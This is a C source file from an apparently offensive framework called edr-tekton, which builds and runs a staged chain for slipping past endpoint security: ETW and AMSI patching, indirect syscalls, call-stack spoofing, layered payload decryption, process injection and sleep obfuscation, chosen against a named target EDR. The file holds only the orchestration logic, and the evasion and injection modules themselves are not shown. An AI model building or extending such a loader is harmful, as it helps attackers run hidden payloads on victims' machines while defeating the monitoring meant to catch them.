/*
 * edr-tekton :: Pipeline Builder
 * Constructs and executes the technique chain.
 */

#include <stdio.h>
#include <string.h>
#include "tekton/core/builder.h"
#include "tekton/core/log.h"

/* ── Stage name lookup ────────────────────────────────── */

static const char* stage_names[] = {
    "FINGERPRINT",
    "API_RESOLVE",
    "EVASION_PRE",
    "SYSCALL_INIT",
    "DECRYPT",
    "INJECT",
    "SLEEP_INIT",
    "CLEANUP",
};

/* ── Module name to category mapping ──────────────────── */

typedef struct {
    const char*     config_field;
    TEKTON_STAGE    stage;
    TEKTON_CATEGORY category;
    BOOL            required;
} TEKTON_STAGE_MAP;

static const TEKTON_STAGE_MAP stage_mappings[] = {
    { "api_resolve",    TEKTON_STAGE_API_RESOLVE,   TEKTON_CAT_API_RESOLVE, TRUE  },
    { "etw_method",     TEKTON_STAGE_EVASION_PRE,   TEKTON_CAT_EVASION,    FALSE },
    { "amsi_method",    TEKTON_STAGE_EVASION_PRE,   TEKTON_CAT_EVASION,    FALSE },
    { "syscall_method", TEKTON_STAGE_SYSCALL_INIT,  TEKTON_CAT_SYSCALL,    TRUE  },
    { "inject_method",  TEKTON_STAGE_INJECT,        TEKTON_CAT_INJECT,     TRUE  },
    { "sleep_method",   TEKTON_STAGE_SLEEP_INIT,    TEKTON_CAT_SLEEP,      FALSE },
    { NULL, 0, 0, FALSE }
};

/* ── Find module by config name ───────────────────────── */

static PTEKTON_MODULE find_module_for_config(const char* module_name) {
    if (!module_name || module_name[0] == '\0') return NULL;

    /* Try exact name match first */
    PTEKTON_MODULE mod = TektonModuleFind(module_name);
    if (mod) return mod;

    /* Try common name transformations */
    char alt_name[128];

    /* "indirect" -> "indirect_syscall" */
    snprintf(alt_name, sizeof(alt_name), "%s_syscall", module_name);
    mod = TektonModuleFind(alt_name);
    if (mod) return mod;

    /* "peb_walk" -> already exact */
    /* "patch_etw_event_write" -> "etw_patch" */
    if (strncmp(module_name, "patch_", 6) == 0) {
        const char* target = module_name + 6;
        if (strstr(target, "etw")) {
            mod = TektonModuleFind("etw_patch");
            if (mod) return mod;
        }
        if (strstr(target, "amsi")) {
            mod = TektonModuleFind("amsi_patch");
            if (mod) return mod;
        }
    }

    /* "poolparty_worker" -> "inject_poolparty_worker" */
    snprintf(alt_name, sizeof(alt_name), "inject_%s", module_name);
    mod = TektonModuleFind(alt_name);
    if (mod) return mod;

    return NULL;
}

/* ── Add entry to pipeline ────────────────────────────── */

static TEKTON_STATUS pipeline_add_entry(
    PTEKTON_PIPELINE    pipeline,
    TEKTON_STAGE        stage,
    PTEKTON_MODULE      module,
    BOOL                optional
) {
    if (pipeline->entry_count >= TEKTON_MAX_PIPELINE_ENTRIES) {
        TLOG_ERROR("Pipeline full (max %d entries)", TEKTON_MAX_PIPELINE_ENTRIES);
        return TEKTON_ERR_PIPELINE_BUILD;
    }

    PTEKTON_PIPELINE_ENTRY entry = &pipeline->entries[pipeline->entry_count];
    entry->stage = stage;
    entry->module = module;
    entry->optional = optional;
    entry->executed = FALSE;
    entry->result = TEKTON_OK;

    pipeline->entry_count++;
    return TEKTON_OK;
}

/* ── Public API ───────────────────────────────────────── */

TEKTON_STATUS TektonPipelineBuild(
    PTEKTON_CONFIG   config,
    PTEKTON_PIPELINE out_pipeline
) {
    if (!config || !out_pipeline) return TEKTON_ERR_INVALID_PARAM;

    memset(out_pipeline, 0, sizeof(TEKTON_PIPELINE));
    memcpy(&out_pipeline->config, config, sizeof(TEKTON_CONFIG));

    /* Initialize context */
    TEKTON_STATUS status = TektonContextInit(&out_pipeline->context);
    if (status != TEKTON_OK) return status;

    TLOG_INFO("Building pipeline from profile: %s", config->profile_name);

    /* ── Stage 1: API Resolution ──────────────────────── */

    if (config->api_resolve[0]) {
        PTEKTON_MODULE mod = find_module_for_config(config->api_resolve);
        if (mod) {
            pipeline_add_entry(out_pipeline, TEKTON_STAGE_API_RESOLVE, mod, FALSE);
        } else {
            TLOG_ERROR("API resolve module not found: '%s'", config->api_resolve);
            return TEKTON_ERR_MODULE_MISSING;
        }
    }

    /* ── Stage 2: Pre-execution Evasion ───────────────── */

    /* ETW patching */
    if (config->etw_method[0]) {
        PTEKTON_MODULE mod = find_module_for_config(config->etw_method);
        if (mod) {
            pipeline_add_entry(out_pipeline, TEKTON_STAGE_EVASION_PRE, mod, TRUE);
        } else {
            TLOG_WARN("ETW module not found: '%s', skipping", config->etw_method);
        }
    }

    /* AMSI patching */
    if (config->amsi_method[0]) {
        PTEKTON_MODULE mod = find_module_for_config(config->amsi_method);
        if (mod) {
            pipeline_add_entry(out_pipeline, TEKTON_STAGE_EVASION_PRE, mod, TRUE);
        } else {
            TLOG_WARN("AMSI module not found: '%s', skipping", config->amsi_method);
        }
    }

    /* ── Stage 3: Syscall Engine ──────────────────────── */

    if (config->syscall_method[0]) {
        PTEKTON_MODULE mod = find_module_for_config(config->syscall_method);
        if (mod) {
            pipeline_add_entry(out_pipeline, TEKTON_STAGE_SYSCALL_INIT, mod, FALSE);
        } else {
            TLOG_ERROR("Syscall module not found: '%s'", config->syscall_method);
            return TEKTON_ERR_MODULE_MISSING;
        }
    }

    /* Call stack spoofing (chains onto syscall stage) */
    if (config->callstack_spoof[0]) {
        PTEKTON_MODULE mod = find_module_for_config(config->callstack_spoof);
        if (mod) {
            pipeline_add_entry(out_pipeline, TEKTON_STAGE_SYSCALL_INIT, mod, TRUE);
        }
    }

    /* ── Stage 4: Decryption ──────────────────────────── */

    /* Encryption layers are handled by the decrypt stage.
     * Each layer module is added in reverse order (outermost first). */
    for (int i = (int)config->encrypt_layer_count - 1; i >= 0; i--) {
        char module_name[64];
        snprintf(module_name, sizeof(module_name), "encrypt_%s", config->encrypt_layers[i].type);
        PTEKTON_MODULE mod = find_module_for_config(module_name);
        if (mod) {
            pipeline_add_entry(out_pipeline, TEKTON_STAGE_DECRYPT, mod, FALSE);
        } else {
            /* Try without prefix */
            mod = find_module_for_config(config->encrypt_layers[i].type);
            if (mod) {
                pipeline_add_entry(out_pipeline, TEKTON_STAGE_DECRYPT, mod, FALSE);
            } else {
                TLOG_ERROR("Encryption module not found: '%s'", config->encrypt_layers[i].type);
                return TEKTON_ERR_MODULE_MISSING;
            }
        }
    }

    /* ── Stage 5: Injection ───────────────────────────── */

    if (config->inject_method[0]) {
        PTEKTON_MODULE mod = find_module_for_config(config->inject_method);
        if (mod) {
            pipeline_add_entry(out_pipeline, TEKTON_STAGE_INJECT, mod, FALSE);
        } else {
            TLOG_ERROR("Injection module not found: '%s'", config->inject_method);
            return TEKTON_ERR_MODULE_MISSING;
        }
    }

    /* ── Stage 6: Sleep Obfuscation ───────────────────── */

    if (config->sleep_method[0]) {
        PTEKTON_MODULE mod = find_module_for_config(config->sleep_method);
        if (mod) {
            pipeline_add_entry(out_pipeline, TEKTON_STAGE_SLEEP_INIT, mod, TRUE);
        }
    }

    out_pipeline->built = TRUE;
    TLOG_INFO("Pipeline built: %lu entries across %d stages",
        out_pipeline->entry_count, TEKTON_STAGE_MAX);

    return TEKTON_OK;
}

TEKTON_STATUS TektonPipelineValidate(PTEKTON_PIPELINE pipeline) {
    if (!pipeline || !pipeline->built) return TEKTON_ERR_INVALID_PARAM;

    TLOG_INFO("Validating pipeline...");

    /* Fingerprint first */
    TEKTON_STATUS status = TektonContextFingerprint(&pipeline->context);
    if (status != TEKTON_OK) return status;

    status = TektonContextDetectEDR(&pipeline->context);
    if (status != TEKTON_OK) return status;

    /* Check each module's compatibility */
    BOOL all_ok = TRUE;
    for (DWORD i = 0; i < pipeline->entry_count; i++) {
        PTEKTON_PIPELINE_ENTRY entry = &pipeline->entries[i];
        PTEKTON_MODULE mod = entry->module;

        if (mod->check_compat) {
            if (!mod->check_compat(mod, &pipeline->context)) {
                if (entry->optional) {
                    TLOG_WARN("Optional module '%s' incompatible, will skip", mod->name);
                } else {
                    TLOG_ERROR("Required module '%s' incompatible", mod->name);
                    all_ok = FALSE;
                }
            }
        }

        /* Check architecture flags */
        if ((mod->flags & TEKTON_MOD_REQUIRES_X64) && !pipeline->context.os.is_x64) {
            TLOG_ERROR("Module '%s' requires x64", mod->name);
            if (!entry->optional) all_ok = FALSE;
        }

        if ((mod->flags & TEKTON_MOD_REQUIRES_WIN11) && !pipeline->context.os.is_win11) {
            TLOG_WARN("Module '%s' designed for Win11 (build %lu)",
                mod->name, pipeline->context.os.build_number);
        }
    }

    pipeline->validated = all_ok;
    if (all_ok) {
        TLOG_INFO("Pipeline validation passed");
    } else {
        TLOG_ERROR("Pipeline validation failed");
    }

    return all_ok ? TEKTON_OK : TEKTON_ERR_COMPAT_FAIL;
}

TEKTON_STATUS TektonPipelineExecute(PTEKTON_PIPELINE pipeline) {
    if (!pipeline || !pipeline->built) return TEKTON_ERR_INVALID_PARAM;

    if (!pipeline->validated) {
        TEKTON_STATUS status = TektonPipelineValidate(pipeline);
        if (status != TEKTON_OK) return status;
    }

    TLOG_INFO("Executing pipeline (%lu entries)...", pipeline->entry_count);

    for (DWORD stage = 0; stage < TEKTON_STAGE_MAX; stage++) {
        TEKTON_STATUS status = TektonPipelineExecuteStage(pipeline, (TEKTON_STAGE)stage);
        if (status != TEKTON_OK) {
            TLOG_ERROR("Pipeline failed at stage %s", stage_names[stage]);
            return status;
        }
    }

    TLOG_INFO("Pipeline execution complete");
    return TEKTON_OK;
}

TEKTON_STATUS TektonPipelineExecuteStage(
    PTEKTON_PIPELINE pipeline,
    TEKTON_STAGE     stage
) {
    if (!pipeline) return TEKTON_ERR_INVALID_PARAM;

    pipeline->context.pipeline_stage = stage;

    for (DWORD i = 0; i < pipeline->entry_count; i++) {
        PTEKTON_PIPELINE_ENTRY entry = &pipeline->entries[i];
        if (entry->stage != stage) continue;
        if (entry->executed) continue;

        PTEKTON_MODULE mod = entry->module;
        TLOG_INFO("[%s] Executing module: %s (ref: %s)",
            stage_names[stage], mod->name,
            mod->skill_ref ? mod->skill_ref : "none");

        /* Initialize */
        if (mod->init) {
            TEKTON_STATUS status = mod->init(mod, &pipeline->context);
            if (status != TEKTON_OK) {
                if (entry->optional) {
                    TLOG_WARN("Optional module '%s' init failed, skipping", mod->name);
                    entry->result = status;
                    entry->executed = TRUE;
                    continue;
                }
                TLOG_ERROR("Module '%s' init failed: %d", mod->name, status);
                entry->result = status;
                return status;
            }
        }

        /* Execute */
        if (mod->execute) {
            TEKTON_STATUS status = mod->execute(mod, &pipeline->context);
            entry->result = status;
            entry->executed = TRUE;

            if (status != TEKTON_OK) {
                if (entry->optional) {
                    TLOG_WARN("Optional module '%s' execute failed, continuing", mod->name);
                    continue;
                }
                TLOG_ERROR("Module '%s' execute failed: %d", mod->name, status);
                return status;
            }

            TLOG_DEBUG("Module '%s' completed successfully", mod->name);
        }
    }

    return TEKTON_OK;
}

TEKTON_STATUS TektonPipelineDryRun(PTEKTON_PIPELINE pipeline) {
    if (!pipeline || !pipeline->built) return TEKTON_ERR_INVALID_PARAM;

    pipeline->context.dry_run = TRUE;

    TEKTON_STATUS status = TektonPipelineValidate(pipeline);
    if (status != TEKTON_OK) return status;

    printf("\n=== edr-tekton Dry Run ===\n");
    printf("Profile: %s\n", pipeline->config.profile_name);
    printf("Target EDR: %s\n", pipeline->config.target_edr);
    printf("OS Build: %lu\n", pipeline->config.target_os_build);
    printf("\n");

    TektonPipelinePrint(pipeline);

    return TEKTON_OK;
}

VOID TektonPipelineDestroy(PTEKTON_PIPELINE pipeline) {
    if (!pipeline) return;

    /* Cleanup all modules */
    for (DWORD i = 0; i < pipeline->entry_count; i++) {
        PTEKTON_MODULE mod = pipeline->entries[i].module;
        if (mod && mod->cleanup) {
            mod->cleanup(mod);
        }
    }

    /* Cleanup context */
    TektonContextCleanup(&pipeline->context);

    /* Free config */
    TektonConfigFree(&pipeline->config);

    memset(pipeline, 0, sizeof(TEKTON_PIPELINE));
}

VOID TektonPipelinePrint(PTEKTON_PIPELINE pipeline) {
    if (!pipeline) return;

    printf("Pipeline (%lu entries):\n", pipeline->entry_count);
    printf("%-4s %-16s %-24s %-8s %-8s %s\n",
        "#", "STAGE", "MODULE", "REF", "RISK", "STATUS");
    printf("---- ---------------- ------------------------ -------- -------- --------\n");

    for (DWORD i = 0; i < pipeline->entry_count; i++) {
        PTEKTON_PIPELINE_ENTRY entry = &pipeline->entries[i];
        PTEKTON_MODULE mod = entry->module;

        DWORD risk = 0;
        if (mod->get_risk_score) {
            risk = mod->get_risk_score(mod);
        }

        const char* status_str = "pending";
        if (entry->executed) {
            status_str = (entry->result == TEKTON_OK) ? "OK" : "FAILED";
        }

        printf("%-4lu %-16s %-24s %-8s %-8lu %s%s\n",
            i + 1,
            stage_names[entry->stage],
            mod->name,
            mod->skill_ref ? mod->skill_ref : "-",
            risk,
            status_str,
            entry->optional ? " (opt)" : "");
    }
    printf("\n");
}
